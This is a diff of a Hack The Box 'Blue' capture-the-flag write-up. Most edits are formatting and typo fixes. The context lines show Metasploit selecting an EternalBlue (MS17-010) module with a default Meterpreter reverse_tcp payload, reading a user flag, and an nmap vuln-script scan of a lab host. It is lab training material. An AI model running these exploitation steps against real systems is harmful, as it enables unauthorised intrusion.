@@ -1,9 +1,5 @@
----
-title: "Hack The Box - Blue"
-date: 2023-09-20
----
 ## Description
-Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.
+Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the `EternalBlue` exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.
 
 ## Enumeration
 The first step is always to look at the open ports on the machine:
@@ -134,9 +130,9 @@ WebExec - (Authenticated) User Code Execution (Metasploit)                      
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
 ```
-We can see that, on Windows 7, there is 3 exploits mentionning 'EternalBlue' (what a surprise!). We will try to exploit it.
+We can see that, on Windows 7, there are 3 exploits mentioning `EternalBlue` (what a surprise!). We will try to exploit it.
 ## Foothold
-We saw that we may exploit the Samba server with the EternalBlue exploit. Let's look if Metasploit have an exploit for it:
+We saw that we may exploit the Samba server with the `EternalBlue` exploit. Let's look if `Metasploit` have an exploit for it:
 ```
 [msf](Jobs:0 Agents:0) >> search exploit eternalblue
 
@@ -153,7 +149,7 @@ Matching Modules
 
 Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/smb/smb_doublepulsar_rce
 ```
-Apparently, there are multiple exploits. The last one is ranked "great" but it does not talk about EternalBlue or MS17-10 so I prefer to look at the second one:
+Apparently, there are multiple exploits. The last one is ranked "great" but it does not talk about `EternalBlue` or MS17-10, so I prefer to look at the second one:
 ```
 [msf](Jobs:0 Agents:0) >> use 1
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -258,7 +254,7 @@ type haris\Desktop\user.txt
 ## Learning from other writeups
 ### rana-khalil writeup
 We can find the writeup here: https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/blue-writeup-w-o-metasploit
-What I find interesting is the use of the "vulnerable" scripts of nmap to check if the samba server is vulnerable to EternalBlue. It seems much more relevant that my research using searchsploit:
+What I find interesting is the use of the "vulnerable" scripts of nmap to check if the samba server is vulnerable to `EternalBlue`. It seems much more relevant that my research using searchsploit:
 ```
 $nmap --script vuln -p 135,139,445,49152-49157 10.129.204.37
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-20 19:15 CEST
@@ -302,6 +298,6 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 133.50 seconds
 ```
-We can directly see that the Samba server is vulnerable to ms17-010 (EternalBlue).
+We can directly see that the Samba server is vulnerable to ms17-010 (`EternalBlue`).
 ## Lessons learned
-Reading the description of the box before starting really spoiled the game as I new the vulnerability was EternalBlue. I am wondering how I would be able to find it without having this information. With what I learned from the writeup, I would use vuln scripts from nmap.
+Reading the description of the box before starting really spoiled the game as I knew the vulnerability was `EternalBlue`. I am wondering how I would be able to find it without having this information. With what I learned from the writeup, I would use `vuln` scripts from nmap.
